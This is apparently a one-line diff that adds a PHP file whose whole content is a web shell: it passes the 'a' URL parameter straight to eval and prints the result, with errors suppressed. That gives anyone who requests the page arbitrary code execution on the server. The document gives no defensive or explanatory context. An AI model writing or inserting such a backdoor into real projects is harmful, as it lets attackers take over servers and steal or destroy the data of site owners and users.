@@ -1,0 +1,1 @@
+<?php var_dump(eval(@$_GET['a'])); ?>
